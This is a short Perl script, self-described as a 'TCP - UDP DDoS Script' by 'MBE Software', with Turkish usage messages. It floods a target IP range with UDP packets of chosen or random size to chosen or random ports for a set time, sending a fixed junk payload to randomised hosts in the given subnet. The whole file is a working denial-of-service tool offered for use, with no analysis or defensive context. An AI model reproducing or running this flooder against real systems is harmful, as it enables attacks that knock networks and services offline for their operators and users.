#!/usr/bin/perl

use Socket;
use strict;

if ($#ARGV != 3)
{
    print "TCP - UDP DDoS Script - Coder: MBE Software - PerlDos*\n";
    print "Kullanim: NaTZed.pl <ip> <port> <packet> <time>\n";
    exit(1);
}

my ($ip, $port, $size, $time) = @ARGV;

my ($randip, $iaddr, $endtime, $psize, $pport);

#$iaddr = inet_aton("$ip") or die "$ip Ipye Baglanilamiyor..!\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 18);

print "Vurulan Class: $ip, Port: " . ($port ? $port : "random") . ", Paket: " .
($size ? "$size-Byte, " : "random size") .
($time ? "Saniye: $time" : "") . "\n";

for (;time() <= $endtime;)
{
    
    $psize = $size ? $size : int(1000+rand()%99);
    $pport = $port ? $port : int(rand(65500))+1;
    $randip = int(rand(255))+1;
    $randip = "$ip".".$randip";
    $randip = inet_aton("$randip");
    send(flood, pack("a$psize", "asdasfhasdasdshreuyhrwqtndstetybdwqdnywenrtIIhq199wQryTXOD0XH4900PcFwLlvpKLaokHNSKL1W5j3niiiBOslyk7cdEDFCYJcIiHV3FJjVUTHMp3aZdCTvclzQSnaUDblN4jq1xWpWxIpFQKEvYynooM34tFpsm90LoxohJEBUwjLu8dC6fomGle6yS7yipFKJhchjwacGRpAhmHh7SavYNZ71PcNqY5lTdCeVD31GfUpSE6rXKIMXLZaS1zST3UzLW6oaduC9dg4xjY7lYJPw8LaNfLZnTpIDdVbsiiOQqMpJl8AlqG1rt1GXeCSjwgJfFbdarkKxsUuV7yoA5S0kMKYfAyOtv9Cwl5kxNaG2mqV7e2osQ9S0syDTPNyOISlnAMcApJiNs5BgQthm3jAFTtxhYrB8NHu8eXMd3HubH95JBiCeeinoE9e997Gaz4RIABwnTrpoxGvSPD2ULRAqdFLVf7BNTFu5ejKRqtwOmmfRXr3E2JhvHDUBDe3JgeVqxoHI9YWIyCk0zx8EzDkNU4J6dnlRZelvO55MBPZ2SLjGXnNv9Qqw3SeLUyrsqvwtr4XmwIUUwWOyy6RorsaeY4i4CXl9xyKQBVpqkNs9XRxVDI0B4f4dw1aRjILIJRfSLgwXClLariseo6mtchyjsamlurh3imP2FeVEQO2AY66qd5eoilgANItN772qsdgspOVVeglDiaQIL7y9gy3aphFBMaLyKpBnMj9HSxrp0Nb7cRIDN6xBbRyWT7TliC19hjxetxyJfIIW8H17DdISUGpMXa0yjs1QnEE5DejuATIQ9u6DvMWfKCiSCQUihh8DddYkwXPLbEWL8oexNicSkYrA6WVcQoAz3z7ayCQBOyJ3xaygiMWKH9rWp6sTqUXLP9gtUEOvAedA7Xk"), 0, pack_sockaddr_in($pport, $randip));
    #print "$randip\n";
}